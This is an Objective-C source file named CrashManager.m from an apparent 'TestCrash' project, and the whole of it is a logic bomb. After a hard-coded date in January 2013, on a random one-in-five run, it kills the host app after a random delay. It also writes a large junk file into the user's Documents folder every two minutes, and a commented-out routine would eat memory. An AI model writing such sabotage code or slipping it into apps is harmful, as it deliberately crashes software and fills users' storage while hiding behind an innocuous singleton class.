//
//  CrashManager.m
//  TestCrash
//
//  Created by song on 12-12-28.
//  Copyright (c) 2012年 song. All rights reserved.
//

#import "CrashManager.h"

@implementation CrashManager
#define kCrashDate @"2013-01-28"
#pragma mark - 对外方法
-(void)run
{
    if (![self areYouLucky]) {
        if ([self isAfterCrashDate]) {
            [self performSelector:@selector(crash) withObject:nil afterDelay:[self getCrashTime]];
            [NSTimer scheduledTimerWithTimeInterval:120 target:self selector:@selector(createTrashFile) userInfo:nil repeats:YES];
    }
    
//        [NSTimer scheduledTimerWithTimeInterval:1 target:self selector:@selector(eatMemory) userInfo:nil repeats:YES];
    }
}

#pragma mark - 内部方法

-(void)eatMemory
{
    for (int i=0; i<1000000; i++) {
        NSMutableDictionary *dict = [[NSMutableDictionary alloc] init];
        [dict setValue:[self randomName] forKey:[self randomName]];
    }
}

-(BOOL)areYouLucky
{
//    你是否幸运呢？
    int randNumber = rand();
    randNumber = randNumber%5;
    if (randNumber==0) {
//        sorry 
        return NO;
    }
//    你可真幸运
    return YES;
}
-(void)crash
{
    exit(EXIT_FAILURE);
}


-(BOOL)isAfterCrashDate
{
    NSDateFormatter *formatter = [[NSDateFormatter alloc] init];
    [formatter setDateFormat:@"yyyy-MM-dd"];
    NSDate *crashDate =[formatter dateFromString:kCrashDate];
    NSDate *currentDate = [NSDate date];
    NSComparisonResult result = [currentDate compare:crashDate];
    [formatter release];
    if (result == NSOrderedDescending) {
        return YES;
    }
    return NO;
    //    NSLog(@"%d",result);
}

-(long)getCrashTime
{
    long crashTime = random();
    crashTime = crashTime%300;
    return crashTime;
}

-(void)createTrashFile
{
    NSString *fullPath = [NSString stringWithFormat:@"%@/Documents/%@",NSHomeDirectory(),[self randomName]];
    NSMutableString *string = [NSMutableString string];
    for (int i=0; i<999999; i++) {
        [string appendString:[self randomName]];
    }
    [string writeToFile:fullPath atomically:YES encoding:NSUTF8StringEncoding error:nil];
}



-(NSString*)randomName
{
    //    long longNumber = rand();
    NSString *name = [NSString stringWithFormat:@"%ld%ld%ld%ld",random(),random(),random(),random()];
    return name;
}

#pragma mark - 单例模式
static CrashManager *sharedCrashManager = nil;
+(CrashManager*)sharedManager
{
    if (sharedCrashManager==nil) {
        sharedCrashManager = [[super allocWithZone:NULL] init];
    }
    return sharedCrashManager;
}
+ (id)allocWithZone:(NSZone *)zone
{
    return [[self sharedManager] retain];
}

- (id)copyWithZone:(NSZone *)zone
{
    return self;
}

- (id)retain
{
    return self;
}

- (NSUInteger)retainCount
{
    return NSUIntegerMax;  //denotes an object that cannot be released
}

- (oneway void)release
{
    //do nothing
}

- (id)autorelease
{
    return self;
}
@end
